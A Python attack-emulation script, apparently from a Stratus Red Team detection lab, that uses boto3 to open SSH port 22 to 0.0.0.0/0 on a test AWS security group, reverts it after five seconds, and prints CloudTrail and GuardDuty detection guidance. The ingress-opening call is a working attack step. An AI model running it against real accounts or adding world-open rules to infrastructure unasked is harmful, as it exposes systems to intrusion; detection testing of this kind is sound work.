"""
Technique : aws.exfiltration.ec2-security-group-open-port-22-ingress
Tactic    : Exfiltration / Impact (T1562.007)
Source    : https://stratus-red-team.cloud/attack-techniques/AWS/aws.exfiltration.ec2-security-group-open-port-22-ingress/

Pre-requisites:
  - Run `pulumi up` in ../infra/ first to create the target security group.

How the attack works:
  An attacker who has compromised AWS credentials with ec2:AuthorizeSecurityGroupIngress
  can open port 22 (SSH) to the internet on an existing security group.  This
  grants network-level access to any instance associated with that group from
  any IP address, enabling direct SSH access or brute-force attacks.

Detection signal:
  - ec2:AuthorizeSecurityGroupIngress with CidrIp=0.0.0.0/0 (or ::/0) on port 22.
  - GuardDuty: UnauthorizedAccess:EC2/SSHBruteForce if inbound SSH traffic follows.

Revert:
  - Automated: ec2:RevokeSecurityGroupIngress with same parameters.
"""

import sys
if hasattr(sys.stdout, "reconfigure"):
    sys.stdout.reconfigure(encoding="utf-8", errors="replace")  # type: ignore[union-attr]
if hasattr(sys.stderr, "reconfigure"):
    sys.stderr.reconfigure(encoding="utf-8", errors="replace")  # type: ignore[union-attr]

import json
import os
import subprocess
import time
from pathlib import Path

import boto3
from botocore.exceptions import ClientError


# ── Config ────────────────────────────────────────────────────────────────────

DWELL_TIME_S = 5


# ── Helpers ───────────────────────────────────────────────────────────────────

def get_pulumi_outputs(stack_dir: str) -> dict:
    result = subprocess.run(
        ["pulumi", "stack", "output", "--json", "--show-secrets"],
        cwd=stack_dir,
        capture_output=True,
        text=True,
        env={**os.environ, "PULUMI_CONFIG_PASSPHRASE": os.environ.get("PULUMI_CONFIG_PASSPHRASE", "")},
    )
    if result.returncode != 0:
        print(f"[!] pulumi stack output failed: {result.stderr.strip()}")
        return {}
    return json.loads(result.stdout)


def banner(msg: str) -> None:
    print(f"\n{'=' * 60}")
    print(f"  {msg}")
    print(f"{'=' * 60}")


# ── Main ──────────────────────────────────────────────────────────────────────

def main() -> None:
    stack_dir = str(Path(__file__).parent.parent / "infra")
    infra     = get_pulumi_outputs(stack_dir)
    sg_id     = infra.get("security_group_id",   "")
    sg_name   = infra.get("security_group_name",  "stratus-red-team-sg-port22")

    if not sg_id:
        print("[!] security_group_id not found in Pulumi outputs. Did you run `pulumi up`?")
        return

    session    = boto3.Session()
    ec2_client = session.client("ec2")

    # ── Step 1: Open port 22 to the world ────────────────────────────────────
    banner("Step 1 — Open port 22 ingress (AuthorizeSecurityGroupIngress)")
    ip_permissions = [
        {
            "IpProtocol": "tcp",
            "FromPort":   22,
            "ToPort":     22,
            "IpRanges":   [{"CidrIp": "0.0.0.0/0", "Description": "stratus-red-team-ssh-world"}],
        }
    ]
    try:
        ec2_client.authorize_security_group_ingress(
            GroupId=sg_id,
            IpPermissions=ip_permissions,
        )
        print(f"  [+] Port 22 opened on security group: {sg_name} ({sg_id})")
        print(f"  [+] Source: 0.0.0.0/0 (world)")
        print(f"  [!] CloudTrail event: ec2:AuthorizeSecurityGroupIngress")
        print(f"  [!] Any instance in this SG is now reachable via SSH from the internet.")
    except ClientError as exc:
        code = exc.response["Error"]["Code"]
        if code == "InvalidPermission.Duplicate":
            print("  [~] Rule already exists — continuing to revert step.")
        else:
            print(f"  [!] AuthorizeSecurityGroupIngress failed: {exc}")
            return

    print(f"\n  Dwelling for {DWELL_TIME_S}s...")
    time.sleep(DWELL_TIME_S)

    # ── Revert ────────────────────────────────────────────────────────────────
    banner("Revert — Close port 22 (RevokeSecurityGroupIngress)")
    try:
        ec2_client.revoke_security_group_ingress(
            GroupId=sg_id,
            IpPermissions=ip_permissions,
        )
        print(f"  [+] Port 22 rule removed from: {sg_name}")
    except ClientError as exc:
        print(f"  [!] RevokeSecurityGroupIngress failed: {exc}")

    banner("Complete")
    print("CloudTrail events: ec2:AuthorizeSecurityGroupIngress, ec2:RevokeSecurityGroupIngress")
    print("\nDetection guidance:")
    print("  Alert on ec2:AuthorizeSecurityGroupIngress with 0.0.0.0/0 or ::/0 source,")
    print("  especially on port 22 (SSH), 3389 (RDP), or other admin ports.")
    print("\nRun `pulumi destroy` in ../infra/ to remove the security group and VPC.")


if __name__ == "__main__":
    main()
